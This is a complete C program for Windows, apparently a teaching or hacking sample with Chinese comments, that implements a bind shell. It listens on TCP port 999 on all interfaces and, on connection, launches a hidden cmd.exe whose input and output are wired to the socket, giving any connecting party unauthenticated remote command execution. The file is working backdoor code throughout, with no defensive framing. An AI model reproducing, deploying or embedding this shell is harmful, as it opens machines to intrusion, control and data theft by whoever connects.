#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#define MasterPort 999

main()
{
	WSADATA WSADa;
	sockaddr_in SockAddrIn;
	SOCKET CSocket, SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[255];

	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&WSADa, sizeof(WSADATA));
	
	// 取得cmd.exe的准确路径
	GetEnvironmentVariable("COMSPEC", szCMDPath, sizeof(szCMDPath));
	
	// the WSAStartup function initiates use of the Winsock DLL by a process
	WSAStartup(0x0202, &WSADa);
	
	SockAddrIn.sin_family = AF_INET;
	SockAddrIn.sin_addr.s_addr = INADDR_ANY;
	SockAddrIn.sin_port = htons(MasterPort);
	CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	
	bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));
	
	listen(CSocket,1);
	iAddrSize = sizeof(SockAddrIn);
	
	// 建立socket通信后, 将新打开的cmd的stdin, stdout, stderr重定向到socket fd
	SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize);
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = (HANDLE)SSocket;
	StartupInfo.hStdOutput = (HANDLE)SSocket;
	StartupInfo.hStdError = (HANDLE)SSocket;
	
	CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
	
	//等到连接断开才结束
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	
	closesocket(CSocket);
	closesocket(SSocket);
	WSACleanup();
	return 0;
}
